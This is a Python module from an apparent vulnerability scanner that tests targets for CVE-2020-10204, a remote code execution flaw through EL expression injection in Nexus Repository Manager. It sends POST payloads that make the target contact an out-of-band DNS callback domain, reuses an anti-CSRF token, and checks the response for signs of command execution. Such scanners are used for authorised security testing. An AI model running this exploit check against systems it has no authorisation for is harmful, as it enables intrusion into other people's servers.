#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2020_10204_scan(self, url):
    ''' 3.21.1及之前版本中, 存在一处任意EL表达式注入漏洞, CVE-2018-16621的绕过 '''
    sessid = '405b1f856a5cad633f19caf344586cce'

    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2020-10204'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2020_10204_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data'].replace('DNSdomain', dns_domain)
        headers = payload['headers']
        target = url + path

        # todo Referer && Origin
        if ('http://' in url):
            proto = 'http://'
        else:
            proto = 'https://'
        headers['Referer'] = proto + logger.get_domain(url)
        headers['Origin'] = proto + logger.get_domain(url)

        # todo Nexus 登录后的csrf token(如果有)
        csrf_token = re.search(r'NX-ANTI-CSRF-TOKEN=0\.\d*', str(self.headers))
        if (csrf_token):
            NX_ANTI_CSRF_TOKEN = csrf_token.group().split('=')
            headers[NX_ANTI_CSRF_TOKEN[0]] = NX_ANTI_CSRF_TOKEN[1]

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(3)
            if ((self.md in check.check_res(res.text, self.md))     # * 可以运行命令, 有回显
                or (md in dns.result(md, sessid))                   # * 可以运行命令, 无回显
                or ('54289' in res.text)                            # * 可以执行EL表达式
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
